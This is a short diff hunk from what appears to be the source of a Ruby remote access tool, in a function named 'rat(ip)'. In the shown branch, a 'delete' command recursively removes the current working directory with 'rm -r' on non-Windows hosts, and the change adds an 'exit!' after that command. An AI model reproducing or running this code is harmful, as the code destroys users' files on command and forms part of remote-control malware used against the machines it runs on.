@@ -98,6 +98,7 @@ def rat(ip)
       when 'delete'
         unless Gem.win_platform?
           exec "rm -r #{Dir.pwd}"
+          exit!
         end
       end
     end
